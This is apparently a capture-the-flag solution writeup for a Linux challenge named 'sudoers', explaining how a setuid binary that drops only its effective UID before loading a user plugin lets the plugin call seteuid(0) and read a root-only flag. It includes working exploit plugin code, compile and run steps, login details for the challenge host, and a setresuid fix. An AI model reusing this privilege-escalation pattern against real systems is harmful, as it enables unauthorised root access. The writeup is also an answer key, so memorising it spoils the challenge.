---
title: sudoers
category: linux
difficulty: medium
points: 100-500
author: boul3h14
date: 2026-11-01
---
# Sudoers — Solution & Writeup

> **Notice:** Do not publish until the CTF ends.

## Red Herring Name
The challenge is named **sudoers** as a deliberate red herring. The target system does not give the `ctf` user `sudo` access, nor is `/etc/sudoers` misconfigured. The actual vulnerability lies in **setuid / SUID privilege retention**, and the custom binary is named `/usr/local/bin/auditdrop` to avoid clashing with standard system utilities like `sudo`.

## Vulnerability Analysis

### RUID, EUID, and SUID
In Linux process credentials:
- **RUID (Real User ID):** Identifies the user who launched the process (`ctf`, UID 1000).
- **EUID (Effective User ID):** Used by the operating system for access control decisions (`root`, UID 0, when executing a setuid-root binary).
- **SUID (Saved Set-User-ID):** Preserves the privileged EUID across a *temporary* privilege drop so the same process can regain privileges later if needed.

### Temporary vs. Permanent Dropping
In `auditdrop.c`, the developer intended to safely run user-supplied code by dropping privileges first:
```c
if (seteuid(getuid()) != 0) {
    perror("seteuid");
    return 1;
}
...
void *plugin = dlopen(path, RTLD_NOW | RTLD_LOCAL);
```
`seteuid(getuid())` modifies **only the EUID**, changing it from 0 to 1000 (`ctf`). The Saved UID (`SUID`) remains **0 (root)**.

Because SUID is still 0:
- Any later call to `seteuid(0)` succeeds (the program's own `write_audit()` logging function does exactly that).
- `dlopen()` maps the user's shared object **into this process**, so the plugin's `audit_note()` runs with the same credentials the process has after the drop.

### Why a child process would not work
An earlier version ran the note through `system("cat <path>")` and hoped the child would inherit `SUID = 0`. It does not: `execve(2)` states that *"the effective user ID of the process is copied to the saved set-user-ID"* — unconditionally, not just for setuid files. Every `fork`+`exec` therefore arrives with RUID = EUID = SUID = 1000, and `seteuid(0)` fails with `EPERM`. The privileged restore only survives **inside** the process, which is exactly what `dlopen()` gives the attacker.

### The Exploit
1. Write a shared object into the notes directory, e.g. `/home/ctf/notes/pwn.so`:

   ```c
   #include <stdio.h>
   #include <unistd.h>

   int audit_note(const char *path) {
       (void)path;
       if (seteuid(0) != 0) { perror("seteuid"); return 1; }
       FILE *f = fopen("/flag", "r");
       if (!f) { perror("fopen"); return 1; }
       char buf[256];
       while (fgets(buf, sizeof buf, f)) fputs(buf, stdout);
       fclose(f);
       return 0;
   }
   ```

2. Compile it: `gcc -shared -fPIC -o /home/ctf/notes/pwn.so /home/ctf/notes/pwn.c`
3. Run `/usr/local/bin/auditdrop pwn.so`. The path check passes because the plugin lives under `NOTES_DIR`; the drop happens; `dlopen()` loads the plugin in-process; `seteuid(0)` restores root because SUID is still 0; `/flag` is readable.

`solution/solve.sh` automates all three steps over SSH.

### Connecting (TLS-wrapped SSH)
The container is not published directly: a Traefik TCP router on the `tcp`
entrypoint matches `HostSNI(sudoers.challs.ingeniums.club)` and terminates TLS
with the `*.challs.ingeniums.club` wildcard, so plain `ssh` cannot speak to it.
Wrap the client in `openssl s_client`:

```sh
ssh -o ProxyCommand='openssl s_client -quiet -servername %h -connect %h:%p' \
    ctf@sudoers.challs.ingeniums.club -p 9450
```

Password `ctf`. `solve.sh` uses the same wrapper (host and port default to the
values above).

### Remediation
To drop privileges permanently and prevent regaining root:
```c
if (setresuid(getuid(), getuid(), getuid()) != 0) {
    perror("setresuid");
    exit(1);
}
```
Setting RUID, EUID, and SUID all to `getuid()` permanently discards root privileges, so no later `seteuid(0)` can succeed. Loading untrusted code into a privileged process is also the wrong primitive: a separate, unprivileged helper that only reports back would avoid handing the attacker in-process execution at all.

## Flag Storage & Deployment (ADR 0004)
In accordance with **ADR 0004**, real event flags live exclusively on the VMs or in GitHub Actions secrets and are never committed to git.
At deployment time, the static container runtime injects the flag via the `FLAG` environment variable through `/entrypoint.sh`, which writes the value to `/flag` with permissions `0600` (owned by `root:root`). The committed files contain only the manifest's declared flag, which CI injects as `FLAG`.
